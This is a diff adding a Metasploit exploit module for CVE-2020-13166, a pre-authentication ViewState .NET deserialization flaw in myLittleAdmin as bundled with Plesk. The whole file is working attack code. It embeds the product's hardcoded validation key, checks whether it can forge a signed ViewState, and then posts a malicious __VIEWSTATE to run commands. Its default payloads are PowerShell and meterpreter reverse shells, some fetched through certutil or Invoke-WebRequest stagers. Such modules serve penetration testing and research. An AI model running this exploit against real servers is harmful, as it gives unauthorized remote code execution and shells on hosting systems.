@@ -1,0 +1,209 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  # <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CA0B0334" />
+  VIEWSTATE_GENERATOR = 'CA0B0334'.freeze
+
+  # <machineKey
+  #   validationKey="5C7EEF6650639D2CB8FAA0DA36AF24452DCF69065F2EDC2C8F2F44C0220BE2E5889CA01A207FC5FCE62D1A5A4F6D2410722261E6A33E77E0628B17AA928039BF"
+  #   decryptionKey="DC47E74EA278F789D2FF0E412AD840A89C10171F408D8AC4"
+  #   validation="SHA1" />
+  VIEWSTATE_VALIDATION_KEY =
+    "\x5c\x7e\xef\x66\x50\x63\x9d\x2c\xb8\xfa\xa0\xda\x36\xaf\x24\x45\x2d\xcf" \
+    "\x69\x06\x5f\x2e\xdc\x2c\x8f\x2f\x44\xc0\x22\x0b\xe2\xe5\x88\x9c\xa0\x1a" \
+    "\x20\x7f\xc5\xfc\xe6\x2d\x1a\x5a\x4f\x6d\x24\x10\x72\x22\x61\xe6\xa3\x3e" \
+    "\x77\xe0\x62\x8b\x17\xaa\x92\x80\x39\xbf".freeze
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::AutoCheck
+  include Msf::Exploit::ViewState
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Plesk/myLittleAdmin ViewState .NET Deserialization',
+        'Description' => %q{
+          This module exploits a ViewState .NET deserialization vulnerability in
+          web-based MS SQL Server management tool myLittleAdmin, for version 3.8
+          and likely older versions, due to hardcoded <machineKey> parameters in
+          the web.config file for ASP.NET.
+
+          Popular web hosting control panel Plesk offers myLittleAdmin as an
+          optional component that is selected automatically during "full"
+          installation. This exploit caters to the Plesk target, though it
+          should work fine against a standalone myLittleAdmin setup.
+
+          Successful exploitation results in code execution as the user running
+          myLittleAdmin, which is IUSRPLESK_sqladmin for Plesk and described as
+          the "SQL Admin MSSQL anonymous account."
+
+          Tested on the latest Plesk Obsidian with optional myLittleAdmin 3.8.
+        },
+        'Author' => [
+          # Reported to SSD (SecuriTeam) by an anonymous researcher
+          # Publicly disclosed by Noam Rathaus of SSD (SecuriTeam)
+          'Spencer McIntyre', # Inspiration
+          'wvu' # Module
+        ],
+        'References' => [
+          ['CVE', '2020-13166'],
+          ['URL', 'https://ssd-disclosure.com/ssd-advisory-mylittleadmin-preauth-rce/'],
+          ['URL', 'https://portswigger.net/daily-swig/mylittleadmin-has-a-big-unpatched-security-flaw']
+        ],
+        'DisclosureDate' => '2020-05-15', # SSD (SecuriTeam) advisory
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
+        'Privileged' => false,
+        'Targets' => [
+          [
+            'Windows Command',
+            'Arch' => ARCH_CMD,
+            'Type' => :win_cmd,
+            'DefaultOptions' => {
+              'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
+            }
+          ],
+          [
+            'Windows Dropper',
+            'Arch' => [ARCH_X86, ARCH_X64],
+            'Type' => :win_dropper,
+            'CmdStagerFlavor' => %i[psh_invokewebrequest certutil vbs],
+            'DefaultOptions' => {
+              'CMDSTAGER::FLAVOR' => :psh_invokewebrequest,
+              'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
+            }
+          ],
+          [
+            'PowerShell Stager',
+            'Arch' => [ARCH_X86, ARCH_X64],
+            'Type' => :psh_stager,
+            'DefaultOptions' => {
+              'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
+            }
+          ]
+        ],
+        'DefaultTarget' => 2,
+        'DefaultOptions' => {
+          'SSL' => true,
+          'WfsDelay' => 10 # First exploit attempt may be a little slow
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        }
+      )
+    )
+
+    register_options([
+      Opt::RPORT(8401, true, 'The myLittleAdmin port (default for Plesk!)'),
+      OptString.new('TARGETURI', [true, 'Base path', '/'])
+    ])
+
+    # XXX: https://github.com/rapid7/metasploit-framework/issues/12963
+    import_target_defaults
+  end
+
+  def check
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path)
+    )
+
+    unless res
+      return CheckCode::Unknown('Target did not respond to check request.')
+    end
+
+    unless res.code == 200 && res.body.include?('myLittleAdmin for SQL Server')
+      return CheckCode::Unknown('Target is not running myLittleAdmin.')
+    end
+
+    vprint_good("myLittleAdmin is running at #{full_uri}")
+    check_viewstate(res.get_html_document)
+  end
+
+  def check_viewstate(html)
+    viewstate = html.at('//input[@id = "__VIEWSTATE"]/@value')&.text
+
+    unless viewstate
+      return CheckCode::Detected("__VIEWSTATE not found, can't complete check.")
+    end
+
+    @viewstate_generator =
+      html.at('//input[@id = "__VIEWSTATEGENERATOR"]/@value')&.text
+
+    unless @viewstate_generator
+      print_warning('__VIEWSTATEGENERATOR not found, using known default value')
+      @viewstate_generator = VIEWSTATE_GENERATOR
+    end
+
+    # ViewState generator needs to be a packed integer now
+    @viewstate_generator = [@viewstate_generator.to_i(16)].pack('V')
+
+    we_can_sign_viewstate = can_sign_viewstate?(
+      viewstate,
+      extra: @viewstate_generator,
+      key: VIEWSTATE_VALIDATION_KEY
+    )
+
+    if we_can_sign_viewstate
+      return CheckCode::Vulnerable('We can sign our own ViewState.')
+    end
+
+    CheckCode::Safe("We can't sign our own ViewState.")
+  end
+
+  def exploit
+    # NOTE: Automatic check is implemented by the AutoCheck mixin
+    super
+
+    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
+
+    case target['Type']
+    when :win_cmd
+      execute_command(payload.encoded)
+    when :win_dropper
+      execute_cmdstager
+    when :psh_stager
+      execute_command(cmd_psh_payload(
+        payload.encoded,
+        payload.arch.first,
+        remove_comspec: true
+      ))
+    end
+  end
+
+  def execute_command(cmd, _opts = {})
+    vprint_status("Serializing command: #{cmd}")
+
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path),
+      'vars_post' => {
+        # This is the only parameter we need for successful exploitation!
+        '__VIEWSTATE' => generate_viewstate_payload(
+          cmd,
+          extra: @viewstate_generator,
+          key: VIEWSTATE_VALIDATION_KEY
+        )
+      }
+    )
+
+    unless res && res.code == 302 && res.redirection.path == '/error/index.html'
+      fail_with(Failure::PayloadFailed, "Could not execute command: #{cmd}")
+    end
+
+    print_good("Successfully executed command: #{cmd}")
+  end
+
+end
